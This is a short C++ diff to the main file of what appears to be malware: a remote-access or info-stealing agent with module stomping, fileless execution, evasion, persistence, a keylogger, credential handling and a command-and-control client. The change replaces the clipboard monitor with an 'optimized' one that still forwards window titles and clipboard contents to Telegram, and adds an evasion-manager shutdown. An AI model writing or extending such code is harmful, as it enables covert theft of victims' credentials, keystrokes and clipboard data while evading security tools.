@@ -53,6 +53,7 @@ using namespace nuub;
 #include "domain/common/ModuleStomping.hpp"
 #include "domain/common/FilelessExec.hpp"
 #include "domain/common/EvasionManager.hpp"
+#include "domain/common/PerformanceOptimizer.hpp"
 #include "infrastructure/system/WindowsShellService.hpp"
 #include "infrastructure/system/WindowsSysInfoService.hpp"
 #include "infrastructure/system/WindowsClipboardService.hpp"
@@ -364,8 +365,8 @@ int main(int argc, char* argv[]) {
     application::commands::CredentialHandler credential_handler(
         telegram.reporter(), config.pc_identifier);
 
-    // ── Clipboard Monitor ──────────────────────────────────────
-    infrastructure::keyboard::ClipboardMonitor clipboard_monitor;
+    // ── Clipboard Monitor (optimized, adaptive polling) ──────────────
+    domain::perf::ClipboardOptimizer clipboard_monitor;
     clipboard_monitor.set_on_change([&telegram](const std::string& window, const std::string& content) {
         std::string msg = "CLIPBOARD [" + window + "]: " + content.substr(0, 200);
         if (content.size() > 200) msg += "...";
@@ -434,6 +435,7 @@ int main(int argc, char* argv[]) {
         persistence.stop_anti_sleep();
         key_listener.stop();
         clipboard_monitor.stop();
+        domain::EvasionManager::instance().shutdown();
         telegram.stop();
         if (c2_client) c2_client->stop();
         spdlog::info("Agent shutting down");
